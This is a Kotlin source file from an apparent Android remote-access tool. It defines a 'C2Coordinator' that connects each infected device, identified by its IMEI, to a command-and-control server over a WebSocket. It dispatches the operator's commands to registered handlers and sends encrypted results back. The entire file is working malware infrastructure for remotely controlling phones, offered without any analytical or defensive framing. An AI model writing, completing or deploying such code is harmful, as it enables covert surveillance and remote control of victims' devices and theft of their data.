package org.synapse.core.c2

import android.content.Context
import android.util.Log
import org.synapse.core.core.CryptoEngine
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.*
import kotlinx.serialization.json.Json

object C2Coordinator {
    private const val TAG = "Synapse.C2"

    private var ws: WebSocketTransport? = null
    private var fcmToken: String? = null
    private var c2BaseUrl: String = ""
    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId: String = ""

    fun start(
        context: Context,
        imei: String,
        serverUrl: String,
        token: String?,
        handlers: Map<String, suspend (Command) -> SynapseResponse>
    ) {
        deviceId = imei
        fcmToken = token
        c2BaseUrl = serverUrl

        CommandDispatcher.register(handlers)
        CommandDispatcher.setDeviceId(imei)

        ws = WebSocketTransport(
            serverUrl = serverUrl,
            onCommand = { cmd ->
                // NON-BLOCKING: dispatch coroutine on IO scope, send result when ready.
                // Avoids runBlocking which starves the OkHttp WebSocket callback thread.
                scope.launch {
                    val raw = CommandDispatcher.dispatch(
                        Json { ignoreUnknownKeys = true }
                            .encodeToString(Command.serializer(), cmd)
                    )
                    ws?.send(CryptoEngine.encrypt(raw))
                }
                // Return empty placeholder immediately — real result sent async.
                CryptoEngine.encrypt("")
            },
            onStatus = { status -> Log.d(TAG, "WS: $status") }
        ).also { it.connect(imei) }
    }

    fun stop() {
        scope.cancel()
        ws?.disconnect()
    }

    fun updateFcmToken(token: String) {
        fcmToken = token
    }

    fun sendResult(payload: String) {
        ws?.send(CryptoEngine.encrypt(payload))
    }

    fun isConnected(): Boolean = ws?.isConnected() == true
}
